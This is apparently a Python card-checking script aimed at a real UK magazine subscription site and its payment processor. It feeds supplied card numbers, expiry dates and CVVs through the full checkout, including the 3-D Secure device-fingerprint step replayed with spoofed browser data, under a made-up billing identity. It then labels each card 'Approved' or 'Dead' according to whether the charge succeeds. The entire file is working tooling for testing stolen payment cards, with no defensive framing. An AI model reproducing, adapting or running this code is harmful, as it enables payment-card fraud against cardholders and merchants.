import base64
from utilsdf.functions import  capture, clean_text
from httpx import AsyncClient


async def ass(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:
        r = await session.get(
            "https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm",
        )
        r_ = r.text
        pi = capture(r_, "prodId=", "&amp")
        ps = capture(r_, "prodSubId=", "&amp")
        to = capture(r_, "_token = '", "'")

        head2 = {
            "Host": "www.isubscribe.co.uk",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm",
        }

        r2 = await session.get(
            f"https://www.isubscribe.co.uk/cart.cfm?action=add&prodId={pi}&prodSubId={ps}&qty=1",
            headers=head2,
        )

        head3 = {
            "Host": "www.isubscribe.co.uk",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://www.isubscribe.co.uk",
            "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=bill&email=sachiopremiun%40gmail.com",
        }

        post3 = f"itemcount=1&guestcheckout=true&userid=&email=sachiopremiun%40gmail.com&title=Mr.&firstname=Sachio&lastname=YT&phone=19006318646&company=&street=1+Warwick+Road&suburb=Thames+Ditton&postcode=KT7+0PR&state=&otherstate=&country=United+Kingdom&prodsubid_1={ps}&prodtitle_1=She+Kicks+Magazine&emaildelivery_1=0&isdigital_1=0&isgiftvoucher_1=0&xmas_start_1=0&renewal_1=0&gift_1=0&senderfirstname_1=+&email_1=&message_1=&senddate_1=18%2F10%2F2023&address_1=billing&title_1=Mr.&firstname_1=Sachio&lastname_1=YT&company_1=&street_1=1+Warwick+Road&suburb_1=Thames+Ditton&postcode_1=KT7+0PR&state_1=United+Kingfonm&country_1=United+Kingdom&publisher_post=0&organisations_post=0&isubscribe_terms=1"

        r3 = await session.post(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setbilling&formmode=new&ajax=true",
            headers=head3,
            data=post3,
        )

        head4 = {
            "Host": "www.isubscribe.co.uk",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=pay",
        }

        if cc.startswith("3"):
            typec = "AMEX"
        elif cc.startswith("4"):
            typec = "VISA"
        elif cc.startswith("5"):
            typec = "Mastercard"

        post4 = f"paymentMethod=creditcard&walletToken=&card={typec}"

        r4 = await session.post(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setpayment&formmode=new&ajax=true",
            headers=head4,
            data=post4,
        )

        head5 = {
            "Host": "www.isubscribe.co.uk",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=pay",
        }

        r5 = await session.get(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=confirm",
            headers=head5,
        )
        r5_ = r5.text
        ft = capture(r5_, "fzToken = '", "'")
        fv = capture(r5_, "fzVerification = '", "'")
        ve = capture(r5_, '"verification" value="', '"')
        ref = capture(r5_, "reference: '", "'")
        am = capture(r5_, "amount: ", ",")

        r6 = await session.get("https://paynow.pmnts.io/sdk/bridge")
        r6_ = r6.text
        cs = capture(r6_, "'X-CSRF-Token': \"", '"')
        xp = capture(r6_, 'xpid:"', '"')

        head7 = {
            "Host": "paynow.pmnts.io",
            "x-newrelic-id": f"{xp}",
            "tracestate": "901863@nr=0-1-901863-1588871235-88c62d684dd15709----1697587746972",
            "x-csrf-token": f"{cs}",
            "traceparent": "00-edaf3d8e87baf8972fcfdd24ec89cc00-88c62d684dd15709-01",
            "authorization": f"Bearer {ft}",
            "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjkwMTg2MyIsImFwIjoiMTU4ODg3MTIzNSIsImlkIjoiODhjNjJkNjg0ZGQxNTcwOSIsInRyIjoiZWRhZjNkOGU4N2JhZjg5NzJmY2ZkZDI0ZWM4OWNjMDAiLCJ0aSI6MTY5NzU4Nzc0Njk3Mn19",
            "content-type": "application/json;charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "origin": "https://paynow.pmnts.io",
            "referer": "https://paynow.pmnts.io/sdk/bridge",
        }

        post7 = {
            "card_holder": "Sachio YT",
            "card_number": f"{cc}",
            "card_expiry": f"{month}/{year}",
            "cvv": f"{cvv}",
        }

        r7 = await session.post(
            "https://paynow.pmnts.io/sdk/credit_cards",
            headers=head7,
            json=post7,
        )
        tok = capture(r7.text, '"token":"', '"')

        head8 = {
            "Host": "api.pmnts.io",
            "fz-merchant-username": "isubscribeunitedkingdom",
            "authorization": f"Bearer {ft}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "application/json, text/plain, */*",
            "fz-sdk-version": "1.2.1",
            "origin": "https://www.isubscribe.co.uk",
            "referer": "https://www.isubscribe.co.uk/",
        }

        post8 = {"amount": f"{am}", "currency": "GBP"}

        r8 = await session.post(
            "https://api.pmnts.io/sca/session", headers=head8, json=post8
        )
        jt = capture(r8.text, '"jwt":"', '"')

        head9 = {
            "Host": "centinelapi.cardinalcommerce.com",
            "content-type": "application/json;charset=UTF-8",
            "x-cardinal-tid": "Tid-ef846307-65af-4406-93ec-d40608456ab8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "origin": "https://www.isubscribe.co.uk",
            "referer": "https://www.isubscribe.co.uk/",
        }

        post9 = {
            "BrowserPayload": {
                "Order": {
                    "OrderDetails": {},
                    "Consumer": {
                        "BillingAddress": {},
                        "ShippingAddress": {},
                        "Account": {},
                    },
                    "Cart": [],
                    "Token": {},
                    "Authorization": {},
                    "Options": {},
                    "CCAExtension": {},
                },
                "SupportsAlternativePayments": {
                    "cca": True,
                    "hostedFields": False,
                    "applepay": False,
                    "discoverwallet": False,
                    "wallet": False,
                    "paypal": False,
                    "visacheckout": False,
                },
            },
            "Client": {"Agent": "SongbirdJS", "Version": "1.35.0"},
            "ConsumerSessionId": None,
            "ServerJWT": f"{jt}",
        }

        r9 = await session.post(
            "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init",
            headers=head9,
            json=post9,
        )
        re_ = capture(r9.text, '"CardinalJWT":"', '"')
        encabezado_base64, carga_util_base64, firma = re_.split(".")
        re_1 = base64.urlsafe_b64decode(
            carga_util_base64 + "=" * (4 - len(carga_util_base64) % 4)
        ).decode("utf-8")
        re = capture(re_1, '"referenceId":"', '",')
        ge = capture(re_1, '"geolocation":"', '"')
        org = capture(re_1, '"orgUnitId":"', '"')

        r10 = await session.get(
            f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",
        )
        no = capture(r10.text, '"nonce":"', '"')

        head11 = {
            "Host": "geo.cardinalcommerce.com",
            "content-type": "application/json",
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://geo.cardinalcommerce.com",
            "referer": f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",
        }

        post11 = {
            "Cookies": {"Legacy": True, "LocalStorage": True, "SessionStorage": True},
            "DeviceChannel": "Browser",
            "Extended": {
                "Browser": {
                    "Adblock": True,
                    "AvailableJsFonts": [],
                    "DoNotTrack": "unknown",
                    "JavaEnabled": False,
                },
                "Device": {
                    "ColorDepth": 24,
                    "Cpu": "unknown",
                    "Platform": "Linux armv81",
                    "TouchSupport": {
                        "MaxTouchPoints": 5,
                        "OnTouchStartAvailable": True,
                        "TouchEventCreationSuccessful": True,
                    },
                },
            },
            "Fingerprint": "5c37a00bc842ac6e5680f0d0906e7896",
            "FingerprintingTime": 1243,
            "FingerprintDetails": {"Version": "1.5.1"},
            "Language": "es-419",
            "Latitude": None,
            "Longitude": None,
            "OrgUnitId": f"{org}",
            "Origin": "Songbird",
            "Plugins": [
                "9mTRIMl5::j0iZMOPuf2jwYMOPmy4kxBIjZUxg368m::~7Co",
                "ECgQIMl::Ml5cWLNOHDJMtWq8HqdOm6laNteXyZr::~cWL",
            ],
            "ReferenceId": f"{re}",
            "Referrer": "",
            "Screen": {
                "FakedResolution": False,
                "Ratio": 2.2222222222222223,
                "Resolution": "800x360",
                "UsableResolution": "800x360",
                "CCAScreenSize": "01",
            },
            "CallSignEnabled": None,
            "ThreatMetrixEnabled": False,
            "ThreatMetrixEventType": "PAYMENT",
            "ThreatMetrixAlias": "Default",
            "TimeOffset": 300,
            "UserAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "UserAgentDetails": {"FakedOS": False, "FakedBrowser": False},
            "BinSessionId": f"{no}",
        }

        r11 = await session.post(
            "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData",
            headers=head11,
            json=post11,
        )

        head12 = {
            "Host": "api.pmnts.io",
            "fz-merchant-username": "isubscribeunitedkingdom",
            "authorization": f"Bearer {ft}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "fz-sdk-version": "1.2.1",
            "accept": "application/json, text/plain, */*",
            "origin": "https://www.isubscribe.co.uk",
            "referer": "https://www.isubscribe.co.uk/",
        }

        post12 = {
            "amount": f"{am}",
            "card_token": f"{tok}",
            "currency": "GBP",
            "reference": f"{ref}",
            "verification": f"{fv}",
            "session_id": f"{re}",
            "challenge_window_size": "05",
            "customer": {
                "first_name": "Sachio",
                "last_name": "YT",
                "email": "sachiopremiun@gmail.com",
                "address": "1 Warwick Road",
                "city": "Thames Ditton",
                "postcode": "KT7 0PR",
                "country": "GB",
            },
        }

        r12 = await session.post(
            "https://api.pmnts.io/sca/enrollment",
            headers=head12,
            json=post12,
        )
        r12_ = r12.text
        enrolled = capture(r12_, '"enrolled":"', '"')
        st = capture(r12_, '"decision":"', '"')
        stc = capture(r12_, '"reason_code":"', '"')

        head13 = {
            "Host": "gateway.pmnts.io",
            "origin": "https://www.isubscribe.co.uk",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.isubscribe.co.uk/",
        }

        post13 = f"return_path=https%3A%2F%2Fwww.isubscribe.co.uk%2Fssl%2Fcheckout%2Findex.cfm%3Fview%3Dnew%26step%3Dconfirm%26mode%3Dadmin%26action%3DplaceOrder%26source%3Dconfirm&verification={ve}&card_type={typec}&card_number={cc}&card_holder=Sachio+YT&expiry_month={month}&expiry_year={year}&cvv={cvv}"

        r13 = await session.post(
            "https://gateway.pmnts.io/v2/credit_cards/direct/isubscribeunitedkingdom",
            headers=head13,
            data=post13,
        )

        head14 = {
            "Host": "www.isubscribe.co.uk",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.isubscribe.co.uk/",
        }

        r14 = await session.get(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=returning&step=confirm&formmode=edit&source=confirm&error=true&errorno=05",
            headers=head14,
        )
        r14_ = r14.text
        msg1 = capture(
            r14_, '<div class="alert alert-danger alert-dismissable" id="', '">'
        )
        msg2 = capture(
            r14_,
            f'<div class="alert alert-danger alert-dismissable" id="{msg1}">',
            "<br>",
        )
        msg = clean_text(msg2)

        vbv = f"{st} - {stc} - {enrolled}"

        if r14.status_code == 302:
            status = "Approved! ✅ -» charged!"
            msg = "Success -» $4"
        elif (
            "The transaction was declined due to insufficient funds, please check with the card issuer or use a different card."
            in msg
        ):
            status = "Approved! ✅ -» low funds"
        else:
            status = "Dead! ❌"

        return status, msg, vbv
